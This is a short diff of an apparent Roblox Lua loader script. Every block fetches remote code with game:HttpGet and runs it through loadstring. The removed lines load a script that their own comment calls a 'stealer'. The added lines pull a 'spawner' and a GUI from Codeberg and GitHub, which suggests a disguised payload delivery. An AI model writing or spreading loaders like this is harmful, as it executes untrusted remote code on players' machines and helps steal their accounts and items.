@@ -1,9 +1,9 @@
 pcall(function()
-    -- Load the real GUI
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()
+    -- Load GrowAFilipino Spawner script from Codeberg
+    loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 end)
 
 pcall(function()
-    -- Load your stealer script from your new GitHub username
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/NoLag/main/NoLag"))()
+    -- Load your RayField GUI
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/RayField/main/RayField"))()
 end)
